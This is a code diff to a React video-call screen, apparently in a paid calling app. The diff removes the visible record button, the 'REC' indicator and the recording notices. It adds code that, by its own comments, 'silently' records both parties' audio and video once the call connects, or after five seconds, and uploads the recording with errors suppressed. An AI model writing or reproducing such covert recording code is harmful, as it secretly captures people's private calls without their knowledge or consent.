@@ -14,7 +14,7 @@ import {
   Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter,
 } from "@/components/ui/dialog";
 import {
-  Video, VideoOff, PhoneOff, Clock, Star, Mic, MicOff, Circle,
+  Video, VideoOff, PhoneOff, Clock, Star, Mic, MicOff,
 } from "lucide-react";
 import { toast } from "sonner";
 import { motion } from "framer-motion";
@@ -90,12 +90,29 @@ const CallSession = () => {
     }
   }, [webrtc.remoteStream]);
 
-  // Track connection state
+  // Track connection state & auto-start silent recording
   useEffect(() => {
     if (webrtc.connectionState === "connected") {
       setCallConnected(true);
+      // Silently start recording when connection is established
+      if (webrtc.localStream && !recorder.isRecording) {
+        recorder.startRecording(webrtc.localStream, webrtc.remoteStream);
+      }
     }
-  }, [webrtc.connectionState]);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [webrtc.connectionState, webrtc.localStream]);
+
+  // Fallback: start recording even without peer connection after 5s
+  useEffect(() => {
+    if (!webrtc.localStream || recorder.isRecording) return;
+    const timer = setTimeout(() => {
+      if (webrtc.localStream && !recorder.isRecording) {
+        recorder.startRecording(webrtc.localStream, webrtc.remoteStream);
+      }
+    }, 5000);
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [webrtc.localStream]);
 
   // Timer
   useEffect(() => {
@@ -107,14 +124,6 @@ const CallSession = () => {
   const durationMinutes = Math.max(Math.ceil(elapsed / 60), 1);
   const runningCost = durationMinutes * pricePerMin;
   const feeAmount = runningCost * (fees.callFeePercent / 100);
-
-  // Start recording
-  const handleStartRecording = useCallback(() => {
-    if (webrtc.localStream) {
-      recorder.startRecording(webrtc.localStream, webrtc.remoteStream);
-      toast.success("Recording started");
-    }
-  }, [webrtc.localStream, webrtc.remoteStream, recorder]);
 
   const handleEndCall = useCallback(async () => {
     if (!callId) return;
@@ -138,11 +147,9 @@ const CallSession = () => {
       });
       await refreshProfile();
 
-      // Upload recording if we have one
+      // Upload recording silently
       if (recordingBlob && recordingBlob.size > 0) {
-        toast.info("Uploading recording...");
-        await recorder.uploadRecording(recordingBlob, callId);
-        toast.success("Recording saved!");
+        recorder.uploadRecording(recordingBlob, callId).catch(() => {});
       }
 
       setSummary({ duration: mins, totalCost: total, fee, net: total - fee });
@@ -258,18 +265,6 @@ const CallSession = () => {
           </div>
         )}
 
-        {/* Recording indicator */}
-        {recorder.isRecording && (
-          <div className="absolute top-4 left-4 z-10 flex items-center gap-2 bg-destructive/90 text-destructive-foreground px-3 py-1.5 rounded-lg">
-            <motion.div
-              animate={{ opacity: [1, 0, 1] }}
-              transition={{ repeat: Infinity, duration: 1 }}
-            >
-              <Circle className="w-3 h-3 fill-current" />
-            </motion.div>
-            <span className="text-xs font-medium">REC</span>
-          </div>
-        )}
       </div>
 
       {/* Controls bar */}
@@ -299,34 +294,15 @@ const CallSession = () => {
             </button>
 
             <button
-              onClick={() => {
-                if (recorder.isRecording) {
-                  recorder.stopRecording();
-                  toast.info("Recording stopped");
-                } else {
-                  handleStartRecording();
-                }
-              }}
-              className={`w-14 h-14 rounded-full flex items-center justify-center transition-colors ${
-                recorder.isRecording
-                  ? "bg-destructive text-destructive-foreground"
-                  : "bg-secondary text-secondary-foreground hover:bg-secondary/80"
-              }`}
-            >
-              <Circle className={`w-6 h-6 ${recorder.isRecording ? "fill-current" : ""}`} />
-            </button>
-
-            <button
               onClick={() => setShowEndDialog(true)}
               className="w-16 h-16 rounded-full bg-destructive text-destructive-foreground flex items-center justify-center shadow-lg hover:bg-destructive/90 transition-colors"
             >
               <PhoneOff className="w-7 h-7" />
             </button>
           </div>
-          <div className="flex justify-center gap-8 mt-2 text-xs text-muted-foreground">
+          <div className="flex justify-center gap-6 mt-2 text-xs text-muted-foreground">
             <span>Mic</span>
             <span>Camera</span>
-            <span>{recorder.isRecording ? "Stop Rec" : "Record"}</span>
             <span>End</span>
           </div>
         </div>
@@ -353,9 +329,6 @@ const CallSession = () => {
                 <span className="text-muted-foreground">৳{feeAmount.toFixed(2)}</span>
               </div>
             </div>
-            {recorder.isRecording && (
-              <p className="text-xs text-primary">Recording will be saved automatically.</p>
-            )}
             <p className="text-xs text-muted-foreground">
               ৳{runningCost.toFixed(2)} will be deducted from your wallet.
             </p>
